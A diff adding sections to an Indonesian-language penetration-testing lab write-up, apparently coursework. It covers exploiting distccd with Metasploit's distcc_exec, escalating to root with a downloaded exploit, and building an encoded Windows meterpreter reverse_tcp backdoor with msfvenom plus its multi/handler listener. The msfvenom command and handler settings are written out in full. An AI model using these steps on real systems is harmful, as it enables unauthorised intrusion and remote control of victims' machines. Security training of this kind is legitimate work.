@@ -184,3 +184,56 @@ nmap -p 1-65535 -A [IP address target]
 ![host_only](asset/tugas5-023/18.png)
 
 target untuk exploit **drb_remote_execcode** adalah berada pada port **8787** 
+
+####Eksploitasi dengan distcc_exec
+
+Untuk melakukan serangan pertama buka **msfconsole** kemudian kita gunakan perintah seperti gambar dibawah ini:
+
+![distcc1](asset/metasploit/distcc_exec.png)
+
+Penjelasan perintah tersebut adalah sebagai berikut:
+>Exploit : exploit/unix/misc/distcc_exec
+>Payload : cmd/unix/bind_ruby
+>RHOST : ip target
+
+Exploit tersebut akan mengeksekusi port 3632 yang dibuka oleh service *distccd*. Kemudian exploit tersebut akan membuka koneksi dengan penyerang dan mebuka shell dari korban. Namun shell tersebut masih menjalankan dengan privilege daemon, sehinggga kita harus menjalankan sebuah *rootkit* untuk mendapat privilege root. Untuk mendapatkannya kita mendownload dari website exploit-db seperti gambar.
+
+![distcc2](asset/metasploit/distcc_exec_2.png)
+
+Setelah itu kita membuat session netcat dengan membuka terminal baru dan melakukan compile pada rootkit tersebut untuk menjalankannya.
+![distcc2](asset/metasploit/distcc_exec_3.png)
+
+Setelah itu, kita menjalankan rootkit yang telah dikompile untuk mendapatkan hak akses root.
+![distcc2](asset/metasploit/distcc_exec_4.png)
+
+
+####Membuat backdoor Untuk Sistem Operasi Windows
+Cara membuat backdoor untuk Sistem Operasi Windows. Untuk melakukannya kita membutuhkan tools **msfconsole** dan juga **msfvenom** untuk membuat backdoor.
+
+Buat backdoor dengan menggunakan perintah:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip_penyerang LPORT=port -f exe -e x86/shikata_ga_nai -i 10 > backdoor.exe
+
+```
+
+Perintah diatas akan membuat sebuah file **.exe** yang jika dieksekusi akan membuat sebuah koneksi dengan IP penyerang menggunakan port 4444.
+![w1](asset/metasploit/windows_8.png)
+
+Setelah itu kita membuka tools **msfconsole** yang digunakan untuk melihat dan melihat terminal yang terbuka. Perintah yang digunakan dapat dilihat pada gambar dibawah ini:
+![w2](asset/metasploit/windows_5.png)
+
+Penjelasan dari gambar diatas adalah:
+```
+exploit: exploit/multi/handler
+payload: windows/meterpreter/reverse_tcp
+LHOST: listen host
+LPORT: lister port
+```
+
+Exploit yang digunakan memungkinkan penyerang mendapatkan shell dari komputer korban jika backdoor tersebut dieksekusi. Payload yang digunakan untuk bekerja pada sistem Operasi Windows. Listen host adalah alamat IP dari penyerang agar backdoor dapat melakukan komunikasi dengan korban. Listen port adalah port yang terbuka untuk melakukan koneksi dengan korban,
+
+Setelah korban mengeksekusi backdoor tersebut maka shell dari korban dapat diakses melalui komputer penyerang.
+
+![w3](asset/metasploit/windows_6.png)
+
+![w3](asset/metasploit/windows_7.png)
